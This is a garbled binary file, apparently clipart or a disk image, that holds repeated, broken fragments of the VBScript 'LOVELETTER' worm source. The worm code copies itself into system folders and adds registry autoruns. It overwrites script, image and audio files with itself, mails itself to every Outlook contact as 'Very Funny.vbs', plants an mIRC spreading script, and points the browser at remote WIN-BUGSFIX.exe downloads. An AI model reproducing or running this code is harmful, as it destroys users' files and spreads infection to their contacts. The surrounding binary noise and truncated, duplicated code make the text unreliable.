�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                         (����2B��
��61%T:���
��������24*���#�ك�����[����*9���� L�33P���*�%"� )�"@��%"
����'Z9��Т&"�5��� ���  ����2�R������"!�� �ɫ��X9�ꙉ1R$���bA�,
��)�����¼�����
�9)���)�� 7�x��c����!#�
��@d-��"1�)��A����F	0�)��qP����""*�)
������pX��T"�ځ� : �������	������ <Z�����'R
©0h��CC�
7���3tCI����09:H�Ι��٭������������̑�tC#2J��$CS!#����Ș@��u3����
��� �5x`��� ��3sP�蛈����rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W                  t\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send�  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           on
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
                  nd if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     �� 	������eB� �� $�6� �����	a� %�R��� ��������sq�ʰ�5�2�C�$�6w1!���4�# E�A��!(���ʻ�0��کC�������G�C�ɸ��D�1���!%�5BA����5�2��4�C7!��4A�!U�ˈ�����9��@������������0w Q�����4�C 4�#�U�3�#
B�
˨�$�!�����	���7�b	� �%�3�	��2�#�	�������P�͹����ʪ�G3Q T�#�$!6
B#1d���"1!g1(��̼�������s#18��R�#B�	�
��#�ݗ�s����$% �ͨ�A�� �432R� �6�1(����*q����@*��$���d���c!�(�"+�܀̫�71��3�60��
�����*�� 
��7
Њɑ����!� ����*�Â˲�ADQ���U���0Aґ��J	Ź���+iQ� ��7�(yы!2��\p�������A�*������3�,��Z08;��*��h�"�91"�WΘ�C�(��+��!��� � �	��EQ����1	Q���隩	���%���3�	��	�����
�1P
�ȁ��K�aA��Y���(p
��)(*K2�"y���8I����(��	�؂A,��
��91	�����S1���� �	��� �� ��A��Й�r4��)��1#��ؘ����"(�����+��� ������@rA"��@�*9\�̩��ix������/:��������3Vx 	���X* ����91@d/2����129+��#F*
��r'�p� p����6	��ɩ���9P����#8�����5����3�2��
��)�G�  � #�$��  X����;�G�	����Qaع��
"�������B!`R��뚻��as�����1!R��Aq��" O�Р�	"��
"���$�4�# ْ�	�˰w3A�ܘ�#B�����
	�U����!�ra�(�����7!A�
�؀� 6X)��ٹ�I+ �����a� (����� 4�@#�C������� ����5W8����T�2q������434 ���c!D�� ː a4��2�!�#1�������@!�����R(1� �����0�����vA������!X���6a0����& !
����!�
�r�����ً���6, ���B!I��� ��6�B ޒ���du!��!��������$4C ���6�(���� �	 ��5��4����ߨ��� �� #�b���М���sB���
��dG( �����4 ���� 1�5�P���Q2�*������"52GEA3 ��ˀ�482�B����23�(���ک��$%		����BQ����#0B2�˸�RD"�� �S )����4��2dȈT C(+����)�3���$"������� c�	ʈ ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ��'592�2��C�
!�	�
���&� ��F�3B�	ɐ� � ����5$!
�͹��������5�4"ͭ��A"1R������"dA3����fs2 �����UU(�����#�b��̰�!����s2�$�a�ꠓ!*ꢪS�51B���t�)�۫����3Af�	���0q
�̩��S3
Q�
�� �'s
웪��(����#RD4 !���ک������F'4C"�1���ۼ����2D 1�ȩT "��ٺ��"70!������G�Cc����4!���AV�2�����ɩ&������́�����*��ɸ�3� �5TD )�ʐ��!d(9�tq��鸁3����tt(!�	 �����$!0��ڠ�%22�  ����c�B�(��B83�)��c��� �U%1������c"�
ɨ$& �����C�"7Q���ș�2 ���ˑ

ڻ������D��  T�� ��!7C!)
̀�"� @��ژۈ�ʋ"�9&�S�e*������R�
����"3#!)�ݯ���D�1���� r�4�"C1���TS#"�����rA����&2���1� 	��ݨ�"#�
�:H?\�!������xp
��!��Zx�������H(����a1		����
����:9ZK�����1"	���H#�����#aA �����1�
��e%�� !���#���8.�� (�#���������,h�ȋ	 ��������( !#2<,�؛�	
���! ��	2'�34"1!������>}��	�09��# J(��

Xp��"����
���+x���� ��&������ڂ�/,����#����5�Pr�1���
S2�����+X����p� ��I�����a 
1�#���X��)!Q��:
�Y����		: 	'� �
 ��K��� ������2�����S�C���$U"ɚ����@9�ڐ���!����"�b8�X���*��R�2��#�r2��ꡚ.
�(�#� �C#"!0*�8s�3b�1˲�!H�����4�i���#u`��Ȁ�k0S�����0��͙��ʿ��
��i382��4�$DF�̬���X�꺊"�7,2Ϙ���cB��������s1���B"�"�4�����r�0��	� �ʠ�ف�B22� ϻ���=ّ������$�(�	E�4� �����B�"!� 2�	��#�@����B�+�"�.� �����Gp$
2	��� ��ˋ������&�B��Q���	�R� $#
��R���C���Q!)���黀��	��������(H���%c4��"�3Vs�������H�����!�������&�2�"8D����7�=��s+1��2�H
����ڑ���B	)�D�13 ��<�����(��8�7�����C	" 4S�A��%" !�A ��̬��8�� ����������6�3H2�3� ������F�4)A��)�΁���Q���S�T�)E�D�!� �� 2	c� �P� ���(��̜�S��ꔂ)2����!�I����$�(D(���ۨ�2 ���u��������b�$I#�2���� V������ 4����6H#��ʽ��R3(�b��ͨ�� �:����"�U"RS�!��������b!�� S
�����̐�#!���G �	�2RC1�E�Ac    �P�A�)�뙡�@�1 5�A4�0���������R� T��ɩ  �
�̽���!���ޙ��U�4� �"2 9	���1  R
���<����:4�1�5���#15�QdAˌ���˸��!B�6�1�ˊ��"� �7�A"$���D�(�ة����Q1PH"ʯؾ���!�1�&#SD!3�����5�!�
���$�#��6�82���������C�  ����˻�����3��������s�")��
��dPD3� 7T�!�!�"�" ����3�D�s2!s�B�����Gt"� � ��̀������������������D�525���3a��ʨ�!� �����d�3�D�)��!F�3�"� G aU�1�	��������E�(
�����G���ٚ��6 1�	�@s�1�� ���������ؐ�E�2�%������#%�$�t�B�!	���Ɉ���������$54Q��遐�0��UD3�3��������	��	����T�B���D�3 B�R� %)t�!�#�3 1������κ����)	�����" �4�$CU�3�"�8��C�����͈�&�:����b�% �D"	T�C1���ɑ��	방!��ʓ�r����ʱ�#!3�"3"36�1�!�"  �"�R���2�U1��#�9S& S�A!# T ���ȩ��
��!?_�����Ћ�,;�1P����'" ������`�Y����������Y�8IqP��������[X���� rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
